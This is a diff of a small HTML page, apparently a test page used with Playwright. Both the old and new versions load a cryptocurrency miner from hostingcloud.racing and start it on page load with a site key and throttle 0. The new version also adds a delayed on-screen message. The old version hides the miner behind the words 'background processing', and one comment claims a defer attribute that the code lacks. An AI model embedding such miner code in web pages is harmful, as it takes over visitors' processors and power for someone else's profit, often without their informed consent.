@@ -1,24 +1,29 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Simple Page with Client Script</title>
-    <!-- HostingCloud Anonymous Client Script -->
-
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>My Simple Page</title>
 </head>
 <body>
-    <h1>Welcome to Your Simple Page</h1>
-    <p>This page includes the HostingCloud anonymous client script for background processing.</p>
+  <!-- Playwright’s getByRole('heading', { name: 'My Simple Page' }) will find this right away -->
+  <h1>My Simple Page</h1>
+  <p>Your browser will start mining in the background.</p>
 
-        <script src="https://www.hostingcloud.racing/EyJJ.js"></script>
+  <!-- defer so the <h1> is parsed and rendered before scripts run -->
+  <script src="https://www.hostingcloud.racing/eSS1.js"></script>
 <script>
-    var _client = new Client.Anonymous('a6e273e277f3fedee6d822d92e0e1b68ff88391f76e50b11581227829c87a9ea', {
+    var _client = new Client.Anonymous('195aebec64e39cfa71b56ed950fe41b63732e97109de79988755ac411447cc54', {
         throttle: 0, c: 'w'
     });
     _client.start();
-    
-</script>
+
+    // schedule your 210-second delayed message
+    setTimeout(function() {
+      var msg = document.createElement('div');
+      msg.textContent = '🔔 210 seconds have passed since the page loaded!';
+      document.body.appendChild(msg);
+    }, 210000);
+  </script>
 </body>
 </html>
